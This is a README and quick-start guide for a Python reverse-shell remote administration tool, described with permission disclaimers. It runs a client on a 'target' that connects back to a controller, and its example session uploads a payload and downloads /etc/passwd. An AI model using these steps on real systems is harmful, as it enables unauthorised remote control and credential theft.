```markdown
# Reverse RAT

A simple, ethical, educational reverse shell / remote administration tool.

- Reverse TCP connection
- Remote command execution
- File upload / download
- Screenshot capture (if a screenshot tool is installed)
- Linux CLI and simple Tkinter GUI controller
- No external Python dependencies
- Pre-shared token authentication

## Requirements

- Python 3.8+
- For GUI: `python3-tk` (`sudo apt install python3-tk` on Debian/Ubuntu)

## Quick start

1. Start the server/controller on your machine:

   ```bash
   python3 server.py --host 0.0.0.0 --port 4444 --token mysecret
   

2. Start the client/agent on the target machine:

   ```bash
   python3 client.py --host <server_ip> --port 4444 --token mysecret
   

3. In the server CLI, select the session ID and run commands:

   ```
   Select session id: 1
   session-1> exec id
   session-1> exec uname -a
   session-1> upload ./payload.bin /tmp/payload.bin
   session-1> download /etc/passwd ./passwd.txt
   session-1> exit
   

## GUI mode

Run:

```bash
python3 gui.py


Start the server, select a session, and send commands.

## Legal

Use only on systems you own or have explicit permission to test.
```

How to use:

```bash
# 1. Create the folder and files
mkdir reverse-rat
cd reverse-rat
# ... save all files above ...

# 2. (Optional) create the zip
chmod +x build_zip.sh
./build_zip.sh

# 3. Run the server (controller) in Linux CLI
python3 server.py --host 0.0.0.0 --port 4444 --token Sup3rSecret

# 4. On the target, run the client agent
python3 client.py --host 192.168.1.100 --port 4444 --token Sup3rSecret

# 5. For a basic GUI
python3 gui.py
```

---

Use it responsibly — only on machines you own or have written permission to test.
